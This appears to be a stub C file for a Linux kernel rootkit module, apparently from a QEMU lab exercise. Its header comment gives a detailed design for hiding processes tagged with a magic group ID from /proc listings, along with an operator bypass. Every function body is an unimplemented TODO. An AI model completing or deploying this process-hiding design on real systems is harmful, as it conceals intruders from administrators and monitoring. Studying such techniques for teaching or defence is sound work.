/*
 * proc_hide.c: hide processes with MAGIC_GID from /proc listings
 *
 * When a process lists /proc, remove entries for any process that has
 * MAGIC_GID in its supplementary groups. Use d_path() to identify /proc:
 * do NOT use d_iname(), it returns the device name for mount points, not
 * the path you expect.
 *
 * Operator bypass: if the calling process has MAGIC_GID, skip filtering.
 * Walk cred->group_info directly: do NOT use in_group_p() (returns true
 * for root, which breaks the bypass).
 *
 * proc_hide_add_pid(): add MAGIC_GID to a target process's supplementary
 * groups so it becomes hidden. This hook is separate from file_hide.c.
 *
 * Reference: prochide.c in the QEMU lab
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <asm/ptrace.h>

#include "rootkit.h"

#define MAX_BUF_SIZE (1 << 16)


static bool active;

int proc_hide_init(void)
{
	/* TODO */
	return -ENOSYS;
}

void proc_hide_exit(void)
{
}

int proc_hide_enable(void)
{
	/* TODO */
	return -ENOSYS;
}

void proc_hide_disable(void)
{
}

bool proc_hide_is_active(void)
{
	return active;
}

/*
 * Add MAGIC_GID to a process's supplementary groups so it becomes hidden.
 */
int proc_hide_add_pid(pid_t pid)
{
	/* TODO */
	return -ENOSYS;
}
